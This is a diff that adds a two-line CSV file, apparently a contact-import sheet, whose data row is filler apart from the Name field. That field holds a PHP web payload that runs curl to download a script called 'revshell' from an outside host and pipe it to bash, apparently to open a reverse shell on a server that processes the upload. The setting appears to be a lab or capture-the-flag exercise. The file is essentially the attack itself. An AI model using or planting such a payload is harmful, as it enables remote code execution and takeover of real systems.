@@ -1,0 +1,2 @@
+Name, Mobile, Email, Group code, Tags
+<?php system("curl http://10.10.14.23:9000/revshell | bash"); ?>, 2, 3, 4, 5
